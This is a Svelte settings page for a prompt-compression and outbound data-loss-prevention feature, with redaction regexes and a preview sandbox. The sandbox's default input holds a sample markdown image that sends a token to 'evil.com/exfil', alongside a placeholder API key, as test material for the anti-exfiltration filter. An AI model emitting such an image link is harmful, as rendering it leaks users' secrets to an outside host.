<script lang="ts">
  import { onMount } from "svelte";
  import Card from "../lib/ui/Card.svelte";
  import Badge from "../lib/ui/Badge.svelte";
  import Button from "../lib/ui/Button.svelte";
  import { fetchTokenSaverConfig, updateTokenSaverConfig } from "../lib/api";
  import type { TokenSaverConfig } from "../lib/types";

  let config = $state<TokenSaverConfig>({
    rtkEnabled: true,
    rtkMaxLines: 250,
    rtkDeduplicate: true,
    cavemanEnabled: false,
    cavemanLevel: "full",
    cavemanLang: "auto",
    cavemanAutoClarity: true,
    cavemanInputMode: false,
    adhdEnabled: false,
    adhdLevel: "full",
    soulEnabled: false,
    soulMode: "auto",
    soulPreset: "atlas",
    soulFilePath: "",
    soulCustomContent: "",
    dlpEnabled: true,
    maskSecrets: true,
    maskPaths: true,
    sanitizeMarkdownImages: true,
    blockDangerousCommands: true,
  });

  let isLoadingConfig = $state<boolean>(true);
  let configLoaded = $state<boolean>(false);
  let loadError = $state<string | null>(null);
  let isSaving = $state<boolean>(false);
  let saveError = $state<string | null>(null);
  let saveSuccess = $state<boolean>(false);
  let sandboxInput = $state<string>(
    "Hello there! I hope you are doing well today. Please test connecting with sk-proj-1234567890abcdef1234567890 on C:\\Users\\Administrator\\Code\n" +
    "console.log('test 1');\n" +
    "console.log('test 1');\n" +
    "console.log('test 1');\n" +
    "![preview](https://evil.com/exfil?token=secret123)\n" +
    "Thank you very much in advance for your kind help and expertise! It is greatly appreciated."
  );
  let sandboxOutput = $state<string>("");
  let originalTokens = $state<number>(0);
  let compressedTokens = $state<number>(0);
  let savingsPercent = $state<number>(0);

  function getErrorMessage(error: unknown, fallback: string): string {
    return error instanceof Error ? error.message : fallback;
  }

  async function loadConfig() {
    isLoadingConfig = true;
    loadError = null;
    try {
      config = await fetchTokenSaverConfig();
      configLoaded = true;
    } catch (error) {
      loadError = getErrorMessage(error, "Unknown configuration load error");
    } finally {
      isLoadingConfig = false;
    }
  }

  onMount(() => {
    void loadConfig();
  });

  async function handleSaveConfig() {
    if (!configLoaded || isLoadingConfig || isSaving) return;
    isSaving = true;
    saveSuccess = false;
    saveError = null;
    try {
      config = await updateTokenSaverConfig(config);
      saveSuccess = true;
      setTimeout(() => (saveSuccess = false), 2500);
    } catch (error) {
      saveError = getErrorMessage(error, "Unknown configuration save error");
    } finally {
      isSaving = false;
    }
  }

  function runCompressionSandbox() {
    let text = sandboxInput;
    const origLen = Math.ceil(text.length / 4);

    // 1. DLP: Secret Redaction
    if (config.maskSecrets) {
      text = text.replace(/\bsk-[A-Za-z0-9_\-]{20,}\b/g, "[REDACTED_API_KEY]");
      text = text.replace(/\bAKIA[0-9A-Z]{16}\b/g, "[REDACTED_AWS_KEY]");
    }

    // 2. DLP: Path Anonymization
    if (config.maskPaths) {
      text = text.replace(/[a-zA-Z]:\\Users\\[^\s\\"'`]+(\\.*)?/gi, "/workspace$1");
      text = text.replace(/\/(?:home|Users)\/[^\s\/"'`]+(\/.*)?/gi, "/workspace$1");
    }

    // 3. DLP: Anti-Exfiltration Markdown Images
    if (config.sanitizeMarkdownImages) {
      text = text.replace(/!\[([^\]]*)\]\((https?:\/\/[^\)]+)\)/gi, "[External image link neutralized to prevent data exfiltration: $1]($2)");
    }

    // 4. RTK Deduplication
    if (config.rtkEnabled) {
      const lines = text.split("\n");
      const deduped: string[] = [];
      let lastLine = "";
      let repeatCount = 0;

      for (const line of lines) {
        if (line.trim() === lastLine.trim() && line.trim().length > 0) {
          repeatCount++;
        } else {
          if (repeatCount > 1) {
            deduped.push(`... [${repeatCount} identical lines suppressed by RTK] ...`);
          }
          repeatCount = 1;
          lastLine = line;
          deduped.push(line);
        }
      }
      if (repeatCount > 1) {
        deduped.push(`... [${repeatCount} identical lines suppressed by RTK] ...`);
      }
      text = deduped.join("\n");
    }

    // 5. Caveman Mode
    if (config.cavemanEnabled) {
      text = text
        .replace(/Hello there!|I hope you are doing well today\.|Could you please take a look at/gi, "")
        .replace(/Thank you very much in advance for your kind help and expertise! It is greatly appreciated\./gi, "")
        .replace(/\n\s*\n/g, "\n")
        .trim();
    }

    sandboxOutput = text;
    originalTokens = origLen;
    compressedTokens = Math.ceil(text.length / 4);
    savingsPercent = Math.max(0, Math.round(((originalTokens - compressedTokens) / originalTokens) * 100));
  }
</script>

<div class="space-y-6">
  <!-- Main Settings Card -->
  <Card padding="md" elev class="space-y-6">
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-border-subtle">
      <div>
        <div class="flex items-center gap-2">
          <h2 class="text-lg font-bold text-text-main tracking-tight">TokenSaver Optimization Engine & Security Guard</h2>
          <Badge tone={!configLoaded ? "neutral" : config.dlpEnabled ? "success" : "warning"} size="sm" dot>
            {#if !configLoaded}
              Outbound DLP Status Unknown
            {:else if config.dlpEnabled}
              Outbound DLP Enabled
            {:else}
              Outbound DLP Disabled
            {/if}
          </Badge>
        </div>
        <p class="text-xs text-text-muted mt-0.5">
          Save prompt tokens, redact sensitive credentials (DLP), and block rogue provider exfiltrations.
        </p>
      </div>

      <div class="flex items-center gap-2.5">
        {#if saveSuccess}
          <span class="text-xs text-emerald-400 font-medium flex items-center gap-1">
            <span class="material-symbols-outlined text-[16px]">check_circle</span>
            <span>Saved!</span>
          </span>
        {/if}
        <Button
          type="button"
          id="tokensaver-save-btn"
          variant="primary"
          size="sm"
          onclick={handleSaveConfig}
          disabled={isSaving || isLoadingConfig || !configLoaded}
        >
          {#if isSaving}
            <span class="material-symbols-outlined text-[16px] animate-spin">progress_activity</span>
            <span>Saving...</span>
          {:else}
            <span class="material-symbols-outlined text-[16px]">save</span>
            <span>Save Settings</span>
          {/if}
        </Button>
      </div>
    </div>

    {#if isLoadingConfig}
      <p id="tokensaver-loading" role="status" aria-live="polite" class="text-xs text-text-muted">
        Loading TokenSaver settings...
      </p>
    {/if}
    {#if loadError}
      <div id="tokensaver-load-error" role="alert" class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 rounded-[10px] border border-red-500/25 bg-red-500/5 p-3">
        <p class="text-xs text-red-500">Could not load TokenSaver settings: {loadError}</p>
        <Button
          type="button"
          id="tokensaver-load-retry-btn"
          variant="secondary"
          size="sm"
          onclick={loadConfig}
          disabled={isLoadingConfig}
        >
          Retry Load
        </Button>
      </div>
    {/if}
    {#if saveError}
      <div id="tokensaver-save-error" role="alert" class="rounded-[10px] border border-red-500/25 bg-red-500/5 p-3">
        <p class="text-xs text-red-500">Could not save TokenSaver settings: {saveError}. Retry with Save Settings.</p>
      </div>
    {/if}

    <!-- Token Optimization Controls Grid -->
    <div>
      <div class="text-xs font-semibold text-text-muted uppercase tracking-wider mb-3">
        Token Optimization Modes
      </div>
      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
        <!-- RTK Deduplication -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">RTK Deduplication</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-rtk-toggle"
                bind:checked={config.rtkEnabled}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-brand-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Deduplicates repeating stack traces and log loops before upstream inference.</p>
        </div>

        <!-- Caveman Mode -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">Caveman Mode</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-caveman-toggle"
                bind:checked={config.cavemanEnabled}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-brand-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Strips conversational pleasantries and filler text while preserving technical precision.</p>
        </div>

        <!-- ADHD Mode -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">ADHD Mode</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-adhd-toggle"
                bind:checked={config.adhdEnabled}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-brand-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Forces immediate, action-first answers without lengthy preamble.</p>
        </div>
      </div>
    </div>

    <!-- Security Guardrails & Anti-Prompt Injection (DLP) -->
    <div>
      <div class="text-xs font-semibold text-text-muted uppercase tracking-wider mb-3 flex items-center gap-1.5">
        <span class="material-symbols-outlined text-[16px] text-emerald-400">shield</span>
        <span>Security Guardrails & DLP (Data Loss Prevention)</span>
      </div>
      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
        <!-- Secret Redaction (DLP) -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">Secret Redaction (DLP)</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-secrets-toggle"
                bind:checked={config.maskSecrets}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Masks API keys (OpenAI, AWS, GitHub), JWTs, database URLs, and private keys before dispatching.</p>
        </div>

        <!-- Workspace Path Anonymization -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">Path Anonymization</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-paths-toggle"
                bind:checked={config.maskPaths}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Normalizes local user home directories (e.g. C:\Users\... &rarr; /workspace) to prevent fingerprinting.</p>
        </div>

        <!-- Anti-Exfiltration Guard -->
        <div class="p-4 rounded-[12px] bg-surface-2 border border-border-subtle space-y-3">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-text-main">Anti-Exfiltration Guard</span>
            <label class="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                id="tokensaver-exfil-toggle"
                bind:checked={config.sanitizeMarkdownImages}
                disabled={!configLoaded || isLoadingConfig}
                class="sr-only peer"
              />
              <div class="w-9 h-5 bg-surface-3 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-500"></div>
            </label>
          </div>
          <p class="text-xs text-text-muted">Neutralizes external markdown image URLs and strips rogue prompt injection exfiltration vectors.</p>
        </div>
      </div>
    </div>
  </Card>

  <!-- Interactive Compression & Security Sandbox -->
  <Card padding="md" elev class="space-y-4">
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border-subtle">
      <div>
        <h3 class="text-sm font-semibold text-text-main">Compression & Security Sandbox</h3>
        <p class="text-xs text-text-muted">Client-side illustration only. It does not call the gateway or reproduce the provider tokenizer and full runtime Security Rules pipeline.</p>
      </div>

      <Button
        type="button"
        id="tokensaver-compress-btn"
        variant="secondary"
        size="sm"
        onclick={runCompressionSandbox}
        disabled={!configLoaded || isLoadingConfig}
      >
        <span class="material-symbols-outlined text-[16px]">play_arrow</span>
        <span>Run Local Preview</span>
      </Button>
    </div>

    <!-- Token Savings Metrics -->
    {#if savingsPercent > 0}
      <div class="grid grid-cols-3 gap-3 p-3 rounded-[10px] bg-brand-500/10 border border-brand-500/25 font-mono text-center">
        <div>
          <span class="text-[10px] text-text-muted block">Estimated Input Tokens</span>
          <strong class="text-xs text-text-main">~{originalTokens}</strong>
        </div>
        <div>
          <span class="text-[10px] text-text-muted block">Estimated Output Tokens</span>
          <strong class="text-xs text-brand-400">~{compressedTokens}</strong>
        </div>
        <div>
          <span class="text-[10px] text-text-muted block">Saved</span>
          <strong class="text-xs text-emerald-400">-{savingsPercent}%</strong>
        </div>
      </div>
    {/if}

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
      <div class="space-y-1.5">
        <label for="sandbox-input" class="text-xs text-text-muted font-medium">Preview Input</label>
        <textarea
          id="sandbox-input"
          bind:value={sandboxInput}
          rows="7"
          class="w-full p-3 rounded-[10px] bg-surface-2 border border-border-subtle text-xs text-text-main font-mono focus:outline-none focus:border-brand-500/50 resize-none leading-relaxed"
        ></textarea>
      </div>

      <div class="space-y-1.5">
        <label for="sandbox-output" class="text-xs text-text-muted font-medium">Local Preview Output</label>
        <textarea
          id="sandbox-output"
          readonly
          value={sandboxOutput}
          rows="7"
          class="w-full p-3 rounded-[10px] bg-surface-2 border border-border-subtle text-xs text-emerald-300 font-mono focus:outline-none resize-none leading-relaxed"
          placeholder="Run the local preview to see the illustrative output..."
        ></textarea>
      </div>
    </div>
  </Card>
</div>
